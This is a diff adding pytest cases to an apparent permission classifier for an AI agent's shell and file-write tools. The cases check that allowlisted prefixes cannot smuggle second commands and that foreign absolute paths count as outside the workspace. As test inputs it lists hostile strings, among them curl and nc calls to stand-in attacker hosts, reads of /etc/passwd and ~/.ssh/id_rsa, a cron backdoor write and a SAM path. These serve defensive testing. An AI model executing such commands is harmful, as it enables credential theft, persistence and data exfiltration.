@@ -85,3 +85,47 @@ def test_refusal_beats_allowlist_prefix():
 def test_decision_serializes_for_the_approval_record():
     payload = classify("write_workspace_file", {"path": "../x", "content": "y"}).to_dict()
     assert set(payload) == {"tier", "reason", "scope", "summary"}
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "pytest; cat /etc/passwd",
+        "pytest && curl http://evil.example/x",
+        "git status | nc attacker.example 4444",
+        "ruff check . > /etc/cron.d/backdoor",
+        "pytest $(cat ~/.ssh/id_rsa)",
+        "git diff `whoami`",
+        "pytest\ncurl http://evil.example",
+    ],
+)
+def test_allowlisted_prefix_does_not_smuggle_a_second_command(command):
+    """`run_command` executes through a shell, so the allowlist has to describe
+    the whole line — not just the program it happens to start with."""
+    decision = classify("run_command", {"command": command})
+    assert decision.tier != TIER_AUTO
+    assert decision.allowed_unattended is False
+
+
+@pytest.mark.parametrize("command", ["git logger --tail", "pytestify run", "ruff checkall"])
+def test_allowlist_matches_on_token_boundaries(command):
+    assert classify("run_command", {"command": command}).tier == TIER_CONFIRM
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        "C:/Windows/System32/drivers/etc/hosts",
+        "C:\\Windows\\System32\\config\\SAM",
+        "D:/data/steal.txt",
+        "\\\\fileserver\\share\\payload.exe",
+        "//fileserver/share/payload.exe",
+    ],
+)
+def test_foreign_absolute_paths_are_not_treated_as_workspace_relative(path):
+    """A drive-letter or UNC path is absolute even where this host cannot resolve
+    it. Judged by the host's rules alone it read as relative and was joined onto
+    the project root, which made leaving the workspace look like staying in it."""
+    decision = classify("write_workspace_file", {"path": path, "content": "x"})
+    assert decision.tier == TIER_CONFIRM
+    assert decision.reason == "writes_outside_workspace"
